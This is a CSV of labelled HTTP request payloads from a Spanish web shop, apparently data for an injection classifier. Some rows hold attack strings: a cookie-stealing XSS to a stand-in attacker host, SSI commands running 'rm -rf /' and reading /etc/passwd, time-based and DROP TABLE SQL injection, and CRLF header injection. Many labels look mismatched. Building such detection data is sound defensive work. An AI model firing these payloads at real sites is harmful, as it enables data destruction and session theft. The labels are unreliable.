payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
"registro | gofron | emenda | Ranger | Jalmar Arambide | avdjusko.polivitskiui@javilasan.kr | 364419A4P | C/ Huerta El Palomar, S/N,  | Moral de la Reina | 26321 | Navarra | 8906753589581639 | Registrar HTTP/1.1",cmd,no,210,0,0,0,1,low
"registro | gofron | emenda | Ranger | Jalmar Arambide | avdjusko.polivitskiui@javilasan.kr | 43344488E | C/ Huerta El Palomar, S/N,  | Moral de la Reina | 26321 | Navarra | 8906753589581639 | Registrar HTTP/1.1",cmd,no,210,0,0,0,1,low
entrar | hisko | misionerasessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | off | Entrar HTTP/1.1,xss,no,184,1,1,0,1,low
entrar | hisko | misionera | off | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,cmd,no,126,0,0,0,1,low
"entrar | hisko | alberc8'q4,ero | off | Entrar HTTP/1.1",cmd,no,55,1,0,0,1,medium
entrar | hisko | misionera | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar | 3076sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Confirmar HTTP/1.1,xss,no,170,1,1,0,1,low
"insertar | 3076 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,63,1,0,0,1,medium
insertar | 3076 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
"registro | hainline4 | M9a | Dayan | Aldeta Marnetti | chanel_ismael@conac.com.ie | 98027307L | C/ Abeja, S/N  | Navalacruz | 24740 | Segovia | 1385468393912662 | Registrar HTTP/1.1",cmd,no,181,0,0,0,1,low
entrar | libbey | 141c1U01'OR'a='a | on | Entrar HTTP/1.1,cmd,no,57,1,0,0,1,medium
entrar | libbey | %3F | on | Entrar HTTP/1.1,cmd,no,44,0,0,0,1,medium
"entrar | libbey | dis/'ant,o | on | Entrar HTTP/1.1",cmd,no,51,1,0,0,1,medium
entrar | libbey | 141c1U01 | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
"2"" AND ""1""=""1 HTTP/1.1",other,no,22,1,0,0,0,high
sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | 2939 | Pasar por caja HTTP/1.1,xss,no,167,1,1,0,1,low
insertar | 2939 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 2939 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | boeyenany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 13st7l75n | off | Entrar HTTP/1.1,cmd,no,105,0,0,0,1,low
entrar | boeyen | 13st7l75n | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar | 1517any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Confirmar HTTP/1.1,cmd,no,90,0,0,0,1,low
"registro | xi-xian9'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | p?erspicacidad | Geraldo | Pedrol | chalon@ingenelec.gl | 10207822P | C/ Paloma, 197  | Laguna Dalga | 47520 | Pontevedra | 3590940446144864 | Registrar HTTP/1.1",sql,no,247,1,0,0,1,low
"registro | xi-xian9 | p?erspicacidad | Geraldo | Pedrol | chalon@ingenelec.gl | 10207822P | C/ Paloma, 197  | Laguna Dalga | 47520 | Pontevedra | 331994682613323 | Registrar HTTP/1.1",cmd,no,182,0,0,0,1,low
"registro | xi-xian9 | p?erspicacidad | Geraldo | Pedrol | chalon@ingenelec.gl | 10207822P | C/ Paloma, 197  | Laguna Dalga | 47520 | Pontevedra | 3590940446144864 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low
registro | myrtie | 9uBIleTE | Aelohim | Coria Echecopar | bonnafe@prensahp.mn | 12879968Z | C/ Vivers 102  | Moralina | 24288 | Cue/nc..a | 0201643055570272 | Registrar HTTP/1.1,cmd,no,178,0,0,0,1,low
registro | myrtie | 9uBIleTE | Aelohim | Coria Echecopar | bonnafe@prensahp.mn | 12879968Z | C/ Vivers 102  | Moralina | 24288 | Madrid | 0201643055570272 | Registrar HTTP/1.1,cmd,no,175,0,0,0,1,low
entrar | mile | DEs9I852d268%3F | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
entrar | mile | DEs9I852d268 | on/ | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | mile | DEs9I852d268 | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
insertar | 2408 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 2408 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | frants | c222Lib6T912 | on | Entrarparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,cmd,no,135,0,0,0,1,low
entrar | frants | c222Lib6T912 | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
"insertar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 5191 | Confirmar HTTP/1.1",sql,no,80,1,1,0,1,low
"insertar | 5191 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,71,1,0,0,1,medium
insertar | 5191 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
"registro | suat | PuerTA1enTAnA | Isis | Piera Atencia | cerini.ban@g@2horas.coop | 23679741E | Calle Torre Dels Socors 29, 11?E | Quiruelas de Vidriales | 34419 | Burgos | 0825075702605085 | Registrar HTTP/1.1",cmd,no,210,0,0,0,1,low
"registro | suat | PuerTA1enTAnA | Isis | Piera Atencia | vinci@espaciodelpintor.ic | 23679741E | Calle Torre Dels Socors 29, 11?E | Quiruelas de Vidriales | 34419 | Burgos | 0825075702605085 | Registrar HTTP/1.1",cmd,no,211,0,0,0,1,low
entrar | mc | cerverano | off/ | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
entrar | mc | cerverano | on | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
entrar | lemaire | 6abe934 | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | Entrar HTTP/1.1,cmd,no,111,0,0,0,1,low
entrar | guo'chun | 6abe934 | on | Entrar HTTP/1.1,cmd,no,50,1,0,0,1,medium
entrar | lemaire | 6abe934 | on | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar | 65any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Pasar por caja HTTP/1.1,cmd,no,90,0,0,0,1,low
insertar | 65 | Pasar por caja/ HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro+ | jyoti | dechado | Tercero | Bori Raich | varhelyi_krzyzewska@santacruzdelvoto.mw | 87721362Y | Dulcinea, 158, 4?G | Valverde del Camino | 19190 | Cuenca | 4412645005602081 | Registrar HTTP/1.1",cmd,no,204,0,0,0,1,low
"registro | jyoti | dechado | Alcui./no | Bori Raich | varhelyi_krzyzewska@santacruzdelvoto.mw | 87721362Y | Dulcinea, 158, 4?G | Valverde del Camino | 19190 | Cuenca | 4412645005602081 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
"registro | jyoti | dechado | Tercero | Bori Raich | varhelyi_krzyzewska@santacruzdelvoto.mw | 87721362Y | Dulcinea, 158, 4?G | Valverde del Camino | 19190 | Cuenca | 4412645005602081 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
"entrar | thisner9 | <SCRIPT>alert(""Paros"");</SCRIPT> | off | Entrar HTTP/1.1",xss,no,76,1,1,0,1,medium
entrar | thisner9 | tanganillas | off/ | Entrar HTTP/1.1,cmd,no,56,0,0,0,1,medium
entrar | thisner9 | tanganillas | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
insertar | 8865 | ');waitfor delay '0:0:15';-- HTTP/1.1,sql,no,55,1,0,0,1,medium
"entrar | ','0','0','0');waitfor delay '0:0:15';-- | espesamente | on | Entrar HTTP/1.1",sql,no,86,1,0,0,1,low
entrar | melfi | espesamente | on/ | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | melfi | espesamente | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar | 161 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 161 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
"registro | loralyn | 95en6e4a3 | Acucio | Bone | dutt@cincocolores.vg | 64AA06A0F | San Francisco S/N,  | Labajos | 50373 | Asturias | 1248447866844219 | Registrar HTTP/1.1",cmd,no,172,0,0,0,1,low
"registro | loralyn | 95en6e4a3 | Acucio | Bone | dutt@cincocolores.vg | 86534861Y | San Francisco S/N,  | Labajos | 50373 | Asturias | 1248447866844219 | Registrar HTTP/1.1",cmd,no,172,0,0,0,1,low
"registro | robbie | 7nexor40ilidad | Milet | Alles Araujo | adix_adam@easyviaggio.com.km | 56876585T | Calle Juan Montilla, 50 1-A | Paterna | 45870' DELETE FROM USERS | Navarra | 9173328900592385 | Registrar HTTP/1.1",cmd,no,217,1,0,0,1,low
registro | robbie | 7nexor40ilidad | Milet | Alles Araujo | adix_adam@easyviaggio.com.km | 56876585T | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | Paterna | 45870 | Navarra | 9173328900592385 | Registrar HTTP/1.1,cmd,no,231,0,0,0,1,low
"registro | robbie | 7nexor40ilidad | Milet | Alles Araujo | adix_adam@easyviaggio.com.km | 56876585T | Calle Juan Montilla, 50 1-A | Paterna | 1949A | Navarra | 9173328900592385 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
"registro | robbie | 7nexor40ilidad | Milet | Alles Araujo | adix_adam@easyviaggio.com.km | 56876585T | Calle Juan Montilla, 50 1-A | Paterna | 45870 | Navarra | 9173328900592385 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
"entrar | krishna | 3o?964I7A1 | on | Entrar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,96,1,1,0,1,low
entrar | krishna | 3o?964I7A1 | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
insertar | 9801 | any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 HTTP/1.1,cmd,no,78,0,0,0,1,medium
insertar | 9801 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 9801 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"entrar | moyna | arable | on | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,84,1,1,0,1,low
entrar | je?anes | arable | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
entrar | moyna | arable | on | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
insertar | 112 | Pasar por cajaany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,cmd,no,94,0,0,0,1,low
%7C | 112 | Pasar por caja HTTP/1.1,cmd,no,35,0,0,0,1,medium
insertar | 112 | Pasar por caja/ HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar | 112 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
"registro | wilkinso | chubasque4o | Rawd,on | Bugnone | hartigan@porqueagel.mc | 54839907H | Calle San Braulio, 198  | Longares | 08440 | Burgos | 3980165808897120 | Registrar HTTP/1.1",cmd,no,184,0,0,0,1,low
"registro | wilkinso | chubasque4o | Tideo | Bugnone | hartigan@porqueagel.mc | 54839907H | Calle San Braulio, 198  | Longares | 08440 | Burgos | 3980165808897120 | Registrar HTTP/1.1",cmd,no,182,0,0,0,1,low
"3 | Queso Manchego | 39 | 67 | <!--#EXEC cmd=""ls /""--> HTTP/1.1",sql,no,63,1,1,0,1,medium
"entrar | dar-der | 3.ra9di/2sa,m55te | on | Entrar HTTP/1.1",cmd,no,59,0,0,0,1,medium
insertar | 8122 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8122 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | janey | 3s3' AND '1'='1 | Candela | Bote Montijo | despotovich.thalbach@easyviaggio.by | 06425800Z | Ronda Del General Mitre S/N,  | Porto do Son | 17143 | Palencia | 8776652546820108 | Registrar HTTP/1.1",cmd,no,215,1,0,0,1,low
"registro | janey | 3s3 | Candela | Bote Montijo | despotovich.thalbach@easyviaggio.by | 06425800Z | Ronda Del General Mitre S/N,  | Porto do Son | 17143 | Palencia | 383906661747415 | Registrar HTTP/1.1",cmd,no,202,0,0,0,1,low
"registro | janey | 3s3 | Candela | Bote Montijo | despotovich.thalbach@easyviaggio.by | 06425800Z | Ronda Del General Mitre S/N,  | Porto do Son | 17143 | Palencia | 8776652546820108 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
entrar | ricketts5 | huidera | off | Entrar'INJECTED_PARAM HTTP/1.1,cmd,no,67,1,0,0,1,medium
entrar | ricketts5 | huidera | off/ | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | ricketts5 | huidera | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
insertar | 7427any%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Pasar por caja HTTP/1.1,cmd,no,89,0,0,0,1,low
insertar | 7427 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
insertar%2B | 5384 | Confirmar HTTP/1.1,cmd,no,39,0,0,0,1,medium
insertar | 5384 | %2B HTTP/1.1,cmd,no,30,0,0,0,1,medium
insertar | 5384 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 5384 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar? | 8384 | Confirmar HTTP/1.1,cmd,no,37,0,0,0,1,medium
"','0');waitfor delay '0:0:15';-- | 8384 | Confirmar HTTP/1.1",sql,no,60,1,0,0,1,medium
insertar | 8384 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8384 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | simser | Canj4l9n | Kimberley | Romaso | partsalev@easyviaggio.web | A'0A5223S | Calle Alfonso Paso 143  | Constantina | 42138 | Lleida | 9910614404544138 | Registrar HTTP/1.1,cmd,no,186,1,0,0,1,low
entrar | starkes | ab393n5tebob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | off | Entrar HTTP/1.1,cmd,no,116,0,0,0,1,low
entrar | starkes | ab393n5te | off | %00 HTTP/1.1,cmd,no,49,0,0,0,1,medium
entrar | starkes | ab393n5te | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
insertar | 6541';waitfor delay '0:0:15';-- | Confirmar HTTP/1.1,sql,no,63,1,0,0,1,medium
| | 6541 | Confirmar HTTP/1.1,cmd,no,29,0,0,0,1,high
insertar | 6541 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 6541 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | northrop | paros%22%20style=%22background:url(javascript:alert('Paros')) | on | Entrar HTTP/1.1,cmd,no,104,1,0,0,1,low
entrar | northrop | desbullar | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
insertar | 6499+ | Pasar por caja HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 6499 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 6499 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | qinghui | disterminar | Nadra | Busquets Baduell | lillo_funk@inoxled.ma | 22652909W | C/ Codigo Correspondencia Oficial Correos-telegrafos, 42 13-B | Peralta de Alcofea | 47814 | V+iz+caya | 5583449016514744 | Registrar HTTP/1.1",cmd,no,240,0,0,0,1,low
"registro | qinghui | disterminar | Nadra | Busquets Baduell | lillo_funk@inoxled.ma | 22652909W | C/ Codigo Correspondencia Oficial Correos-telegrafos, 42 13-B | Peralta de Alcofea | 47814 | Guadalajara | 5583449016514744 | Registrar HTTP/1.1",cmd,no,242,0,0,0,1,low
entrar | cad'y | af73o76fad8 | off | Entrar HTTP/1.1,cmd,no,52,1,0,0,1,medium
entrar | delcine3 | af73o76fad8 | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
insertar | 4633';waitfor delay '0:0:15';-- | Confirmar HTTP/1.1,sql,no,63,1,0,0,1,medium
insertar | 4633 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
entrar | walt0 | e2cr1t0c0 | off | Entrar@40 HTTP/1.1,cmd,no,53,0,0,0,1,medium
"entrar | de_w,itt | e2cr1t0c0 | off | Entrar HTTP/1.1",cmd,no,53,0,0,0,1,medium
entrar | walt0 | e2cr1t0c0 | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar | 9352 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 9352 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | gunn | D88Ino | Nuncia | Badell Macia | sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | 09955823C | C/ Closa De Torroja S/N 12-B | Loiu | 12580 | Asturias | 9649891877150082 | Registrar HTTP/1.1,cmd,no,506,0,0,0,1,low
registro | gunn | D88Ino | Nuncia | Badell Macia | vydra@sms24h.no | 4B1319B30B2D | C/ Closa De Torroja S/N 12-B | Loiu | 12580 | Asturias | 9649891877150082 | Registrar HTTP/1.1,cmd,no,178,0,0,0,1,low
registro | gunn | D88Ino | Nuncia | Badell Macia | vydra@sms24h.no | 09955823C | C/ Closa De Torroja S/N 12-B | Loiu | 12580 | Asturias | 9649891877150082 | Registrar HTTP/1.1,cmd,no,175,0,0,0,1,low
"registro | perceval | 0er,0lle31 | Parmenio | D'Molino Bocas | jay@almascanarias.wf | 96398598D | Lepant 33,  | Benuza | 26560 | Guadalajara | 2171179152751946 | Registrar HTTP/1.1",cmd,no,180,1,0,0,1,low
"registro | perceval | tin86 | Parmenio | D'Molino Bocas | jay@almascanarias.wf | 96398598D | Lepant 33,  | Benuza | 26560 | Guadalajara | 2171179152751946 | Registrar HTTP/1.1",cmd,no,175,1,0,0,1,low
entrar | vivier | 59ni87 | off | Entrar%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1,cmd,no,100,0,0,0,1,low
entrar | vivier | 'OR'a='a | off | Entrar HTTP/1.1,cmd,no,50,1,0,0,1,medium
"entrar | vivier | p32'/,5I5a | off | Entrar HTTP/1.1",cmd,no,52,1,0,0,1,medium
insertarany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 5565 | Confirmar HTTP/1.1,cmd,no,87,0,0,0,1,low
insertar | 5565 | paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,cmd,no,88,1,0,0,1,low
insertar | 5565 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5565 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | ''dien*a | maridablemente | on | Entrar HTTP/1.1,cmd,no,57,1,0,0,1,medium
entrar | arlen | maridablemente | on | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | 5698 | Pasar por caja';waitfor delay '0:0:15';-- HTTP/1.1,sql,no,68,1,0,0,1,medium
insertar | 5698 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 5698 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"entrar | carmelo"" AND ""1""=""1 | pREcis*A | off | Entrar HTTP/1.1",cmd,no,63,1,0,0,1,medium
entrar | carmelo | pREcis*A | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar%7C | 7602 | Confirmar HTTP/1.1,cmd,no,39,0,0,0,1,medium
insertar | 7602 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7602 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | schaffel3 | 5ub9ltern3nte | Teinad | Agraso Feixas | callam@mtos.by | 32857731T | C/ Leon Felipe, 31  | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | 44589 | Palencia | 4714732630974118 | Registrar HTTP/1.1",xss,no,308,1,1,0,1,low
"registro | schaffel3 | 5ub9ltern3nte | Teinad | Agraso Feixas | callam@mtos.by | 32857731T | C/ Leon Felipe, 31  | Trucios-Turtzioz | 44589 | Ba.rcelona | 4714732630974118 | Registrar HTTP/1.1",cmd,no,192,0,0,0,1,low
"registro | schaffel3 | 5ub9ltern3nte | Teinad | Agraso Feixas | callam@mtos.by | 32857731T | C/ Leon Felipe, 31  | Trucios-Turtzioz | 44589 | Palencia | 4714732630974118 | Registrar HTTP/1.1",cmd,no,190,0,0,0,1,low
"registro | vasiliad | E8COp762R | Gilberto | Brzozowski | novis@cementoscalibra.gy%3F | 69084830Y | Av. Del Cantabrico 121, 2?B | Bergondo | 10135 | Lleida | 7240523818698482 | Registrar HTTP/1.1",cmd,no,195,0,0,0,1,low
"registro | vasiliad | E8COp762R | Gilberto | Brzozowski | ocallaghan_overlander@progr@amagestione@rp.ph | 69084830Y | Av. Del Cantabrico 121, 2?B | Bergondo | 10135 | Lleida | 7240523818698482 | Registrar HTTP/1.1",cmd,no,213,0,0,0,1,low
"registro | vasiliad | E8COp762R | Gilberto | Brzozowski | novis@cementoscalibra.gy | 69084830Y | Av. Del Cantabrico 121, 2?B | Bergondo | 10135 | Lleida | 7240523818698482 | Registrar HTTP/1.1",cmd,no,192,0,0,0,1,low
"entrar','0','0','0');waitfor delay '0:0:15';-- | krowlek | veintidoseno | off | Entrar HTTP/1.1",sql,no,95,1,0,0,1,low
entrar | AND 1=1 | veintidoseno | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
entrar | krowlek | 13/7I6a7 | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | krowlek | veintidoseno | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 4135 | Pasar por caja HTTP/1.1,cmd,no,87,0,0,0,1,low
insertar | 4135 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 4135 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"insertar | <!--#include file=""archivo_secreto"" --> | Pasar por caja HTTP/1.1",sql,no,76,1,1,0,1,medium
insertar | 1972 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 1972 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | galluzzi | 3nt7epa3es | Laurentino | Arteaga Manzanares | neol@barnicesuv.museum | 18445968Z | Calle Beato Nicolas Factor 76,  | Ballesteros de Calatravaparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | 46148 | Zamora | 1294969325590040 | Registrar HTTP/1.1",cmd,no,303,0,0,0,1,low
"registro | galluzzi | 3nt7epa3es | Laurentino | Arteaga Manzanares | m@y@asnikova@show.nom@.es | 18445968Z | Calle Beato Nicolas Factor 76,  | Ballesteros de Calatrava | 46148 | Zamora | 1294969325590040 | Registrar HTTP/1.1",cmd,no,224,0,0,0,1,low
"registro | galluzzi | 3nt7epa3es | Laurentino | Arteaga Manzanares | neol@barnicesuv.museum | 18445968Z | Calle Beato Nicolas Factor 76,  | Ballesteros de Calatrava | 46148 | Zamora | 1294969325590040 | Registrar HTTP/1.1",cmd,no,221,0,0,0,1,low
entrarsessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? | sabry | ce8cuate | off | Entrar HTTP/1.1,cmd,no,395,0,0,0,1,low
"entrar | sabry | /31l'PA0t,e | off | Entrar HTTP/1.1",cmd,no,52,1,0,0,1,medium
entrar | sabry | ce8cuate | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
"insertar | 2426 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,80,1,0,0,1,low
insertar | 2426 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 2426 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | christel | ?t3a01bl1 | Nador | Paredes | cancellieri@enla.fr | 39547146A | Descanso, ++105  | Sant Ferriol | 09680 | Alicante | 3806763384332425 | Registrar HTTP/1.1",cmd,no,176,0,0,0,1,low
registro | christel | ?t3a01bl1 | Nador | Paredes | cancellieri@enla.fr | 39547146A | Calle Bodegon 141 7B | Sant Ferriol | 09680 | Alicante | 3806763384332425 | Registrar HTTP/1.1,cmd,no,180,0,0,0,1,low
insertar | 8112paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | Pasar por caja HTTP/1.1,cmd,no,123,0,0,0,1,low
insertar | 8112 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | jeri | 8n6s17D741a49e | Eutimio | Zamudio | bannen@masqueclases.ch | 98531799Y | Geologo Palacios, 134, 13?B | Puigverd de Lleida | 09560 | + | 3173800761137477 | Registrar HTTP/1.1",cmd,no,192,0,0,0,1,low
"registro | jeri | 8n6s17D741a49e | Eutimio | Zamudio | bannen@masqueclases.ch | 98531799Y | Ca*mino Alque+ria De La Campaneta, 122  | Puigverd de Lleida | 09560 | Teruel | 3173800761137477 | Registrar HTTP/1.1",cmd,no,209,0,0,0,1,low
"registro | jeri | 8n6s17D741a49e | Eutimio | Zamudio | bannen@masqueclases.ch | 98531799Y | Geologo Palacios, 134, 13?B | Puigverd de Lleida | 09560 | Teruel | 3173800761137477 | Registrar HTTP/1.1",cmd,no,197,0,0,0,1,low
entrar | tailor | inju2i44t2 | bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | Entrar HTTP/1.1,xss,no,97,0,1,0,1,low
entrar | tailor | inju2i44t2 | off/ | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
insertar | 8157 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8157 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"entrar | dionysus | vuesa | on','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1",sql,no,92,1,0,0,1,low
